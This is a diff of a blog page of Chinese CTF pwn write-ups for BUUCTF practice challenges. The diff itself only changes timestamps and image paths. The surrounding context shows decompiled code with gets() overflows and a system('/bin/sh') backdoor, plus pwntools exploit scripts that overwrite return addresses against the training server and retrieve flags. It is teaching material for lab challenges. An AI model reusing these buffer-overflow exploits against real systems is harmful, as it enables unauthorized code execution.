@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.ghostfoxy.cn/banner/2.png">
 <meta property="article:published_time" content="2025-11-14T11:17:04.000Z">
-<meta property="article:modified_time" content="2025-11-16T16:11:47.207Z">
+<meta property="article:modified_time" content="2025-11-17T03:10:59.899Z">
 <meta property="article:author" content="Gh0stF0xy">
 <meta property="article:tag" content="pwn 题解 write-ups">
 <meta name="twitter:card" content="summary_large_image">
@@ -292,7 +292,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-11-17T00:11:47+08:00
+                    本文最后更新于 2025-11-17T11:10:59+08:00
                   
                   
 
@@ -320,7 +320,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br>	<span class="hljs-comment">//注释中标注了s数组的大小和位置：长为15，距离栈底15</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>); <span class="hljs-comment">//输入提示</span><br>  gets(s, argv); <span class="hljs-comment">//危险函数gets()：由于不检查输入字符串的长度，再加上没有金丝雀保护，说明可以执行栈溢出</span><br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>在函数列表里发现了一个疑似后门函数fun()：</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/img/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>fun()的代码：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<span class="hljs-comment">//直接给了shell</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -334,7 +334,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cyclic 100 #生成长度为100的字符串<br>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa<br></code></pre></td></tr></table></figure>
 
 <p>将字符串输入调试平台：</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/img/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>此时我们得到了溢出地址：0x6161686161616761</p>
 <p>验证偏移：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cyclic -l 0x6161686161616761<br>23<br></code></pre></td></tr></table></figure>
@@ -355,7 +355,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 exp.py<br></code></pre></td></tr></table></figure>
 
 <p>发现没打通：</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/img/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>什么原因呢？大概率是我们没有做到堆栈平衡。堆栈平衡的概念我会在后面的博客里讲到。简单来说就是要保证payload代码片段长度是16的倍数，所以我们需要再加一个8字节长度的片段。一般使用ret片段。</p>
 <p>一般在ida的汇编界面可以找到ret片段，这里用一个更优雅的方法：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rip --only <span class="hljs-string">&quot;ret&quot;</span></span><br>Gadgets information<br>============================================================<br>0x0000000000401016 : ret<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
@@ -386,7 +386,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26088</span>)<br>offset = <span class="hljs-number">72</span><br>sub40060d = <span class="hljs-number">0x40060d</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(sub40060d)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>成功打通拿到flag</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/img/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>看一下程序的保护：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>  RELRO:      Partial RELRO<br>  Stack:      No canary found<br>  NX:         NX enabled #NX开启，无法使用shellcode<br>  PIE:        No PIE (0x400000)<br>  Stripped:   No<br></code></pre></td></tr></table></figure>
 
@@ -399,7 +399,7 @@
 <p>v1的”入口”在rbp-30h的地址上作为起点，v2的起始地址是rbp-4h</p>
 <p>偏移量为48-4&#x3D;44</p>
 <p>所以要填充44长度的垃圾数据后篡改v2的值</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p><img src="/img/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>查看汇编代码，发现有ucomiss的比较语句，将v2的值和变量dword_4007F4进行比较，可以知道这个dword就是11.28125</p>
 <p>双击查看十六进制的形式，可知是0x41348000</p>
 <p>从而构造exp:</p>
@@ -409,7 +409,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] Opening connection to node5.buuoj.cn on port 26545: Done<br>[DEBUG] Sent 0x35 bytes:<br>    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│<br>    *<br>    00000020  61 61 61 61  61 61 61 61  61 61 61 61  00 80 34 41  │aaaa│aaaa│aaaa│··4A│<br>    00000030  00 00 00 00  0a                                     │····│·│<br>    00000035<br>[*] Switching to interactive mode<br>[DEBUG] Received 0x17 bytes:<br>    b&quot;Let&#x27;s guess the number.&quot;<br>Let&#x27;s guess the number.[DEBUG] Received 0x2c bytes:<br>    b&#x27;\n&#x27;<br>    b&#x27;flag&#123;8f0b4e7a-10a6-4706-870e-78563a885f32&#125;\n&#x27;<br><br>flag&#123;8f0b4e7a-10a6-4706-870e-78563a885f32&#125;<br>[*] Got EOF while reading in interactive<br></code></pre></td></tr></table></figure>
 
 <p>**思路2：**跳转system的地址执行system(“cat &#x2F;flag”)</p>
-<p><img src="/Users/jonathanlfz/myblog/source/img/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p><img src="/img/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>由汇编可知，system(“cat &#x2F;flag”)这条指令的地址是0x4006BE</p>
 <p>覆盖v1 v2和rbp之后，将返回地址覆盖为0x4006BE</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26545</span>)<br>offset = <span class="hljs-number">0x30</span> + <span class="hljs-number">0x8</span><br>system_addr = <span class="hljs-number">0x4006BE</span><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
